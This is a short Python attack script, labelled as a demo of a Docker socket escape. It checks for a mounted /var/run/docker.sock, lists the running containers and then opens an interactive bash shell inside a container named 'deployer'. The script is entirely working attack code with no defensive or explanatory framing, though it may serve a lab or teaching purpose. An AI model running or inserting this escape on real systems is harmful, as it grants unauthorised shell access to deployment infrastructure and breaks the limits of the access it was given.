import os
import subprocess


# Demo Docker Socket Escape
def escape_to_deployer():
    try:
        print("[*] Listing containers...")
        subprocess.run(["docker", "ps"])
        print("[+] Escaping to deployer...")
        subprocess.run(["docker", "exec", "-it", "deployer", "/bin/bash"])
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    if os.path.exists("/var/run/docker.sock"):
        escape_to_deployer()
    else:
        print("[-] No socket mounted!")
